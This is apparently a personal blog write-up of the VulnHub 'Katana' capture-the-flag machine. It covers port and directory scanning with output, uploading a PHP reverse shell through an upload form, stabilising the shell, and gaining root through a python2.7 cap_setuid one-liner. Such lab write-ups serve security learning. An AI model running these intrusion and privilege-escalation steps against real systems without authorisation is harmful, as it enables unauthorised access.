---
title: Katana - Writeup
author: Elman Alizadeh
date: 2022-05-30 15:30:00 +0800
categories: [ctf, VulnHub]
tags: [vulnhub, katana]
---

Today we will take a look at Vulnhub: Katana. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes.

![Desktop View]({{ "/assets/img/vuln-katana/1.jpeg" | relative_url }})

## Network scan

```console
nmap -p- -sV -sC --open 192.168.213.83

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 89:4f:3a:54:01:f8:dc:b6:6e:e0:78:fc:60:a6:de:35 (RSA)
|   256 dd:ac:cc:4e:43:81:6b:e3:2d:f3:12:a1:3e:4b:a3:22 (ECDSA)
|_  256 cc:e6:25:c0:c6:11:9f:88:f6:c4:26:1e:de:fa:e9:8b (ED25519)
80/tcp   open  http          Apache httpd 2.4.38 ((Debian))
|_http-title: Katana X
|_http-server-header: Apache/2.4.38 (Debian)
7080/tcp open  ssl/empowerid LiteSpeed
|_http-title: Did not follow redirect to https://192.168.213.83:7080/
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=katana/organizationName=webadmin/countryName=US
| Not valid before: 2020-05-11T13:57:36
|_Not valid after:  2022-05-11T13:57:36
|_http-server-header: LiteSpeed
| tls-alpn: 
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
8088/tcp open  http          LiteSpeed httpd
|_http-title: Katana X
|_http-server-header: LiteSpeed
8715/tcp open  http          nginx 1.14.2
|_http-title: 401 Authorization Required
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Content
|_http-server-header: nginx/1.14.2
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Gobuster

After scanning all the ports, I found something like this.

Command: gobuster dir -u http://192.168.213.83:8088 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php,.txt

```console
/index.html           (Status: 200) [Size: 655]
/cgi-bin              (Status: 301) [Size: 1260] [--> http://192.168.213.83:8088/cgi-bin/]
/img                  (Status: 301) [Size: 1260] [--> http://192.168.213.83:8088/img/]    
/docs                 (Status: 301) [Size: 1260] [--> http://192.168.213.83:8088/docs/]   
/upload.html          (Status: 200) [Size: 6480]                                          
/upload.php           (Status: 200) [Size: 1800]
```

## Reverse Shell

http://192.168.213.83:8088/upload.html

![Desktop View]({{ "/assets/img/vuln-katana/2.png" | relative_url }})

I couldn’t get the shell when I wrote the extension. So I checked the extension one by one at the ports.

http://192.168.213.83:8715/katana_reverse.php


![Desktop View]({{ "/assets/img/vuln-katana/3.png" | relative_url }})

After logging in

```console
Command: script /dev/null -c bash

Command: export TERM=xterm

Ctrl+z

Command: reset
```

## Root

Command: getcap -r / 2>/dev/null

```console
/usr/bin/python2.7 = cap_setuid+ep
```

[Linux_Priv](https://0x1.gitlab.io/exploit/Linux-Privilege-Escalation/)

Command: /usr/bin/python2.7 -c ‘import os; os.setuid(0); os.system(“/bin/bash”);’

![Desktop View]({{ "/assets/img/vuln-katana/4.png" | relative_url }})

### And now we are the root

![Desktop View]({{ "/assets/img/vuln-katana/5.gif" | relative_url }})
